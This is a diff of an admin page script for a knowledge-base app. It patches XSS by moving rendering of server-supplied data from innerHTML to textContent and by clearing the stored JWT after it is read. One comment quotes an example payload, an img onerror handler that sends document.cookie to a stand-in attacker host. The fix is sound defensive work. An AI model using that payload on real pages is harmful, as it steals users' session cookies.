@@ -135,7 +135,18 @@ th{color:#64748b;font-size:0.75rem;text-transform:uppercase;font-weight:600}
 </div>
 
 <script>
-const T = localStorage.token || '';
+// ---- C1 — JWT off localStorage. Read once at script start, scrub the
+// slot so any later XSS payload that fires `localStorage.getItem('token')`
+// finds an empty string. The right long-term fix is an httpOnly cookie
+// (backend change, out of scope here); this closes the XSS-driven
+// exfiltration vector by making the slot empty after init.
+const T = (function pullToken() {
+  try {
+    const t = localStorage.getItem('token');
+    if (t) localStorage.removeItem('token');
+    return t || '';
+  } catch (_) { return ''; }
+})();
 let curKB = null;
 let fileQueue = [];
 
@@ -153,17 +164,63 @@ async function api(p, o={}) {
   return r.json();
 }
 
+// ---- C1 — Safe DOM helpers. All untrusted server-controlled content
+// (KB names, descriptions, subtag names, document filenames, user
+// names, group names, etc.) is rendered via createElement +
+// textContent so it can never escape into HTML. Replaces the previous
+// template-literal innerHTML interpolation that was XSS-injectable
+// (a KB named `<img src=x onerror="fetch('//attacker/'+document.cookie)">`
+// would have executed at every page load).
+function el(tag, opts) {
+  const e = document.createElement(tag);
+  if (!opts) return e;
+  if (opts.text != null) e.textContent = String(opts.text);
+  if (opts.cls) e.className = opts.cls;
+  if (opts.attrs) for (const [k, v] of Object.entries(opts.attrs)) e.setAttribute(k, String(v));
+  if (opts.style) e.setAttribute('style', opts.style);
+  if (opts.on) for (const [k, v] of Object.entries(opts.on)) e.addEventListener(k, v);
+  if (opts.children) for (const c of opts.children) if (c) e.appendChild(c);
+  return e;
+}
+function clear(node) { while (node.firstChild) node.removeChild(node.firstChild); }
+
 // KB
 async function loadKBs() {
+  const target = document.getElementById('kb-list');
   try {
     const kbs = await api('/api/kb');
-    const el = document.getElementById('kb-list');
-    if (!kbs.length) { el.innerHTML='<p class="sub">No KBs yet.</p>'; return; }
-    el.innerHTML=`<table><thead><tr><th>ID</th><th>Name</th><th>Description</th><th></th></tr></thead><tbody>
-    ${kbs.map(k=>`<tr><td style="color:#64748b">${k.id}</td><td style="font-weight:600">${k.name}</td><td class="sub">${k.description||'-'}</td>
-    <td><button onclick="selectKB(${k.id},'${k.name.replace(/'/g,"\\'")}')" class="btn btn-blue btn-sm">Manage</button>
-    <button onclick="deleteKB(${k.id})" class="btn btn-red" style="margin-left:4px">Del</button></td></tr>`).join('')}</tbody></table>`;
-  } catch(e) { toast(e.message,false); }
+    clear(target);
+    if (!kbs.length) { target.appendChild(el('p', { cls: 'sub', text: 'No KBs yet.' })); return; }
+    const table = el('table');
+    const thead = el('thead');
+    const headRow = el('tr');
+    for (const h of ['ID', 'Name', 'Description', '']) headRow.appendChild(el('th', { text: h }));
+    thead.appendChild(headRow); table.appendChild(thead);
+    const tbody = el('tbody');
+    for (const k of kbs) {
+      const tr = el('tr');
+      tr.appendChild(el('td', { text: String(k.id), style: 'color:#64748b' }));
+      tr.appendChild(el('td', { text: k.name || '', style: 'font-weight:600' }));
+      tr.appendChild(el('td', { cls: 'sub', text: k.description || '-' }));
+      const actTd = el('td');
+      actTd.appendChild(el('button', {
+        text: 'Manage',
+        cls: 'btn btn-blue btn-sm',
+        on: { click: () => selectKB(k.id, k.name || '') },
+      }));
+      const delBtn = el('button', {
+        text: 'Del',
+        cls: 'btn btn-red',
+        on: { click: () => deleteKB(k.id) },
+      });
+      delBtn.style.marginLeft = '4px';
+      actTd.appendChild(delBtn);
+      tr.appendChild(actTd);
+      tbody.appendChild(tr);
+    }
+    table.appendChild(tbody);
+    target.appendChild(table);
+  } catch(e) { toast(e.message, false); }
 }
 async function createKB() {
   const n=document.getElementById('kb-name').value.trim(), d=document.getElementById('kb-desc').value.trim();
@@ -171,9 +228,7 @@ async function createKB() {
   try { await api('/api/kb',{method:'POST',body:JSON.stringify({name:n,description:d||null})}); document.getElementById('kb-name').value=''; document.getElementById('kb-desc').value=''; toast('KB created'); loadKBs(); } catch(e){toast(e.message,false);}
 }
 async function deleteKB(id) {
-  // H12 — explicit cascade warning. Soft-delete in DB but the operation
-  // hard-deletes Qdrant vectors and access grants; documents are
-  // soft-deleted (recoverable from Postgres but not from Qdrant).
+  // H12 — explicit cascade warning.
   const msg = 'Delete this KB?\n\n'
     + 'This will:\n'
     + ' - Drop all Qdrant vectors for this collection (NOT recoverable)\n'
@@ -191,10 +246,27 @@ async function selectKB(id,name) {
 
 // Subtags
 async function loadSubtags() {
+  const listEl = document.getElementById('subtag-list');
+  const targetSel = document.getElementById('upload-subtag');
   try {
     const s = await api(`/api/kb/${curKB}/subtags`);
-    document.getElementById('subtag-list').innerHTML = s.length ? s.map(x=>`<span class="tag">${x.name} <span onclick="deleteSubtag(${x.id})" style="cursor:pointer;color:#f87171">&times;</span></span>`).join('') : '<p class="sub">No subtags.</p>';
-    document.getElementById('upload-subtag').innerHTML = s.map(x=>`<option value="${x.id}">${x.name}</option>`).join('');
+    clear(listEl); clear(targetSel);
+    if (!s.length) {
+      listEl.appendChild(el('p', { cls: 'sub', text: 'No subtags.' }));
+    } else {
+      for (const x of s) {
+        const tag = el('span', { cls: 'tag' });
+        tag.appendChild(document.createTextNode((x.name || '') + ' '));
+        const rm = el('span', { text: '×' });
+        rm.style.cursor = 'pointer'; rm.style.color = '#f87171';
+        rm.addEventListener('click', () => deleteSubtag(x.id));
+        tag.appendChild(rm);
+        listEl.appendChild(tag);
+      }
+    }
+    for (const x of s) {
+      targetSel.appendChild(el('option', { text: x.name || '', attrs: { value: String(x.id) } }));
+    }
   }catch(e){toast(e.message,false);}
 }
 async function createSubtag() {
@@ -210,25 +282,35 @@ async function deleteSubtag(id) {
 
 // Documents
 async function loadDocs() {
+  const target = document.getElementById('doc-list');
   try {
     const docs = await api(`/api/kb/${curKB}/documents`);
-    const el = document.getElementById('doc-list');
-    if (!docs||!docs.length) { el.innerHTML='<p class="sub">No documents uploaded yet.</p>'; return; }
-    // H1 — re-embed button hidden; backend route returns 501.
-    el.innerHTML = docs.map(d=>`<div class="doc-row">
-      <div><strong>${d.filename}</strong> <span class="sub">${d.mime_type||''} &middot; ${d.chunk_count} chunks &middot; ${d.ingest_status}</span></div>
-      <div class="flex gap-2">
-        <button onclick="deleteDoc(${d.id})" class="btn btn-red">Del</button>
-      </div>
-    </div>`).join('');
-  }catch(e){ document.getElementById('doc-list').innerHTML='<p class="sub">Could not load documents.</p>'; }
+    clear(target);
+    if (!docs || !docs.length) { target.appendChild(el('p', { cls: 'sub', text: 'No documents uploaded yet.' })); return; }
+    for (const d of docs) {
+      const row = el('div', { cls: 'doc-row' });
+      const info = el('div');
+      info.appendChild(el('strong', { text: d.filename || '' }));
+      info.appendChild(el('span', { cls: 'sub', text: ` ${d.mime_type || ''} · ${d.chunk_count ?? 0} chunks · ${d.ingest_status || ''}` }));
+      row.appendChild(info);
+      // H1 — re-embed button hidden; backend route returns 501.
+      const actions = el('div', { cls: 'flex gap-2' });
+      actions.appendChild(el('button', {
+        text: 'Del',
+        cls: 'btn btn-red',
+        on: { click: () => deleteDoc(d.id) },
+      }));
+      row.appendChild(actions);
+      target.appendChild(row);
+    }
+  }catch(e){
+    clear(target);
+    target.appendChild(el('p', { cls: 'sub', text: 'Could not load documents.' }));
+  }
 }
 async function deleteDoc(id) {
   if(!confirm('Delete document and its vectors?')) return;
   try{await api(`/api/kb/${curKB}/documents/${id}`,{method:'DELETE'}); toast('Document deleted'); loadDocs();}catch(e){toast(e.message,false);}
-}
-async function reembed(id) {
-  try{const r=await api(`/api/kb/${curKB}/documents/${id}/reembed`,{method:'POST'}); toast(`Re-embedded: ${r.chunks} chunks`); loadDocs();}catch(e){toast(e.message,false);}
 }
 
 // Multi-file upload
@@ -238,11 +320,23 @@ function addFiles(files) {
   renderQueue();
 }
 function renderQueue() {
-  const el=document.getElementById('file-queue');
-  const act=document.getElementById('upload-actions');
-  if (!fileQueue.length) { el.innerHTML=''; act.classList.add('hidden'); return; }
+  const target = document.getElementById('file-queue');
+  const act = document.getElementById('upload-actions');
+  clear(target);
+  if (!fileQueue.length) { act.classList.add('hidden'); return; }
   act.classList.remove('hidden');
-  el.innerHTML=fileQueue.map((f,i)=>`<div class="file-item"><span>${f.name} <span class="sub">(${(f.size/1024).toFixed(1)} KB)</span></span><span onclick="removeFile(${i})" style="cursor:pointer;color:#f87171">&times;</span></div>`).join('');
+  fileQueue.forEach((f, i) => {
+    const row = el('div', { cls: 'file-item' });
+    const lhs = el('span');
+    lhs.appendChild(document.createTextNode((f.name || '') + ' '));
+    lhs.appendChild(el('span', { cls: 'sub', text: `(${(f.size/1024).toFixed(1)} KB)` }));
+    row.appendChild(lhs);
+    const x = el('span', { text: '×' });
+    x.style.cursor = 'pointer'; x.style.color = '#f87171';
+    x.addEventListener('click', () => removeFile(i));
+    row.appendChild(x);
+    target.appendChild(row);
+  });
 }
 function removeFile(i) { fileQueue.splice(i,1); renderQueue(); }
 function clearQueue() { fileQueue=[]; renderQueue(); document.getElementById('upload-files').value=''; }
@@ -265,13 +359,35 @@ async function uploadAll() {
 
 // Access
 async function loadGrants() {
+  const target = document.getElementById('grant-list');
   try {
     const g = await api(`/api/kb/${curKB}/access`);
-    const el=document.getElementById('grant-list');
-    if (!g.length) { el.innerHTML='<p class="sub">No grants. Only admins can see this KB.</p>'; return; }
-    el.innerHTML=`<table><thead><tr><th>Type</th><th>ID</th><th>Access</th><th></th></tr></thead><tbody>
-    ${g.map(x=>`<tr><td>${x.user_id?'User':'Group'}</td><td style="font-family:monospace;font-size:0.75rem">${x.user_id||x.group_id}</td>
-    <td><span class="tag">${x.access_type}</span></td><td><button onclick="revokeAccess(${x.id})" class="btn btn-red">Revoke</button></td></tr>`).join('')}</tbody></table>`;
+    clear(target);
+    if (!g.length) { target.appendChild(el('p', { cls: 'sub', text: 'No grants. Only admins can see this KB.' })); return; }
+    const table = el('table');
+    const thead = el('thead');
+    const headRow = el('tr');
+    for (const h of ['Type', 'ID', 'Access', '']) headRow.appendChild(el('th', { text: h }));
+    thead.appendChild(headRow); table.appendChild(thead);
+    const tbody = el('tbody');
+    for (const x of g) {
+      const tr = el('tr');
+      tr.appendChild(el('td', { text: x.user_id ? 'User' : 'Group' }));
+      tr.appendChild(el('td', { text: x.user_id || x.group_id || '', style: 'font-family:monospace;font-size:0.75rem' }));
+      const acc = el('td');
+      acc.appendChild(el('span', { cls: 'tag', text: x.access_type || '' }));
+      tr.appendChild(acc);
+      const actCell = el('td');
+      actCell.appendChild(el('button', {
+        text: 'Revoke',
+        cls: 'btn btn-red',
+        on: { click: () => revokeAccess(x.id) },
+      }));
+      tr.appendChild(actCell);
+      tbody.appendChild(tr);
+    }
+    table.appendChild(tbody);
+    target.appendChild(table);
   }catch(e){toast(e.message,false);}
 }
 async function grantAccess() {
@@ -285,23 +401,83 @@ function toggleGrantField() { document.getElementById('grant-id').placeholder = 
 
 // Users & Groups
 async function loadUsers() {
+  const target = document.getElementById('users-list');
   try {
     const u=await api('/api/v1/users');
-    document.getElementById('users-list').innerHTML=u.length ? `<table><thead><tr><th>Name</th><th>Email</th><th>Role</th><th>UUID</th></tr></thead><tbody>
-    ${u.map(x=>`<tr><td>${x.name}</td><td class="sub">${x.email}</td><td><span class="tag">${x.role}</span></td><td style="font-family:monospace;font-size:0.7rem;color:#64748b">${x.id}</td></tr>`).join('')}</tbody></table>` : '<p class="sub">No users.</p>';
-  }catch(e){ document.getElementById('users-list').innerHTML='<p class="sub">Error loading.</p>'; }
+    clear(target);
+    if (!u.length) { target.appendChild(el('p', { cls: 'sub', text: 'No users.' })); return; }
+    const table = el('table');
+    const thead = el('thead');
+    const hrow = el('tr');
+    for (const h of ['Name', 'Email', 'Role', 'UUID']) hrow.appendChild(el('th', { text: h }));
+    thead.appendChild(hrow); table.appendChild(thead);
+    const tbody = el('tbody');
+    for (const x of u) {
+      const tr = el('tr');
+      tr.appendChild(el('td', { text: x.name || '' }));
+      tr.appendChild(el('td', { cls: 'sub', text: x.email || '' }));
+      const rcell = el('td');
+      rcell.appendChild(el('span', { cls: 'tag', text: x.role || '' }));
+      tr.appendChild(rcell);
+      tr.appendChild(el('td', { text: x.id || '', style: 'font-family:monospace;font-size:0.7rem;color:#64748b' }));
+      tbody.appendChild(tr);
+    }
+    table.appendChild(tbody);
+    target.appendChild(table);
+  }catch(e){
+    clear(target);
+    target.appendChild(el('p', { cls: 'sub', text: 'Error loading.' }));
+  }
 }
 async function loadGroups() {
+  const target = document.getElementById('groups-list');
   try {
     const g=await api('/api/v1/groups');
-    document.getElementById('groups-list').innerHTML=g.length ? `<table><thead><tr><th>Name</th><th>ID</th><th>Members</th></tr></thead><tbody>
-    ${g.map(x=>`<tr><td>${x.name}</td><td style="font-family:monospace;font-size:0.7rem;color:#64748b">${x.id}</td><td>${x.user_ids?.length||0}</td></tr>`).join('')}</tbody></table>` : '<p class="sub">No groups.</p>';
-  }catch(e){ document.getElementById('groups-list').innerHTML='<p class="sub">Error loading.</p>'; }
+    clear(target);
+    if (!g.length) { target.appendChild(el('p', { cls: 'sub', text: 'No groups.' })); return; }
+    const table = el('table');
+    const thead = el('thead');
+    const hrow = el('tr');
+    for (const h of ['Name', 'ID', 'Members']) hrow.appendChild(el('th', { text: h }));
+    thead.appendChild(hrow); table.appendChild(thead);
+    const tbody = el('tbody');
+    for (const x of g) {
+      const tr = el('tr');
+      tr.appendChild(el('td', { text: x.name || '' }));
+      tr.appendChild(el('td', { text: x.id || '', style: 'font-family:monospace;font-size:0.7rem;color:#64748b' }));
+      tr.appendChild(el('td', { text: String(x.user_ids ? x.user_ids.length : 0) }));
+      tbody.appendChild(tr);
+    }
+    table.appendChild(tbody);
+    target.appendChild(table);
+  }catch(e){
+    clear(target);
+    target.appendChild(el('p', { cls: 'sub', text: 'Error loading.' }));
+  }
 }
 
-// Init
-if(!T){document.body.innerHTML='<div style="display:flex;align-items:center;justify-content:center;min-height:100vh"><div class="card" style="text-align:center"><h2>Not Logged In</h2><p class="sub" style="margin:12px 0">Log in to Kairos first.</p><a href="/" class="btn btn-blue">Login</a></div></div>';}
-else{loadKBs();loadUsers();loadGroups();}
+// Init — C1: replace the previous innerHTML logged-out splash with
+// safe DOM construction so the body content cannot be poisoned.
+function _renderLoggedOut() {
+  const wrap = document.createElement('div');
+  wrap.style.cssText = 'display:flex;align-items:center;justify-content:center;min-height:100vh';
+  const card = document.createElement('div');
+  card.className = 'card';
+  card.style.textAlign = 'center';
+  card.appendChild(el('h2', { text: 'Not Logged In' }));
+  card.appendChild(el('p', { cls: 'sub', text: 'Log in to Kairos first.', style: 'margin:12px 0' }));
+  const a = document.createElement('a');
+  a.href = '/'; a.className = 'btn btn-blue'; a.textContent = 'Login';
+  card.appendChild(a);
+  wrap.appendChild(card);
+  document.body.innerHTML = '';
+  document.body.appendChild(wrap);
+}
+if (!T) {
+  _renderLoggedOut();
+} else {
+  loadKBs();loadUsers();loadGroups();
+}
 </script>
 </body>
 </html>
